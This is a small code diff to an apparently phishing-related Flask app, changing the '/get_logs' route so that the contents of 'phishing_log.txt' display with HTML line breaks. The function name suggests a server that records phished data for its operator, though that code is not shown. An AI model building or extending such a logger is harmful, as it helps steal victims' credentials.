@@ -55,7 +55,7 @@ def phishing_logger():
 @app.route("/get_logs")
 def get_logs():
     with open("phishing_log.txt") as f:
-        result = f.read()
+        result = f.read().replace("\n", "<br>")
     return result
 
 app.run()
